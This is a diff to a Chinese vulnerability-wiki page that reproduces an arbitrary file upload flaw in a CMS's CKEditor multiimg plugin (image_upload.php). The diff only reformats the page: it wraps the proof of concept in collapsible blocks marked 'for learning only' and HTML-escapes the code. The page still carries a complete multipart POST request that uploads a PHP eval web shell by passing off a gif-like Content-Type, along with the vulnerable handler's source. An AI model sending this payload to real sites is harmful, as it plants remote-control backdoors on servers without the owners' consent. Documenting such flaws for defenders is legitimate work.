@@ -25,8 +25,10 @@ tags:
 
 ```
 "/seller.php?s=/Public/login"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 登录页面如下
@@ -36,7 +38,7 @@ tags:
 漏洞文件为 CK编辑器的 image_upload.php
 
 ```php
-<?php
+&lt;?php
  define ( 'IN_BAMBOO', true );
  // 取得根目录
 define ( 'ROOT_PATH', '../../../../' );  // back to your root path
@@ -63,7 +65,7 @@ if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
 		exit ();
 	}
 	
-	if ($file ['size'] > $max_size) { // 判断文件大小是否大于500000字节
+	if ($file ['size'] &gt; $max_size) { // 判断文件大小是否大于500000字节
 		echo '{"result":"400","msg":"上传图片太大，最大支持：'.($max_size/1024).'KB"}';
 		exit ();
 	}
@@ -93,13 +95,16 @@ if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
 	}
 }
 
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 其中使用 **Content-Type:** [**http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif**](http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif)  即可绕过上传PHP文件
 
-```plain
-POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-plain">POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
 Host: 
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
 Content-Length: 208
@@ -108,9 +113,10 @@ Content-Length: 208
 Content-Disposition: form-data; name="files"; filename="test.php"
 Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 
-<?php @eval($_POST[test]);?>
-------WebKitFormBoundary8UaANmWAgM4BqBSs—
-```
+&lt;?php @&#101;val(&#36;_POST[test]);?&gt;
+------WebKitFormBoundary8UaANmWAgM4BqBSs—</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170928692.png)
 
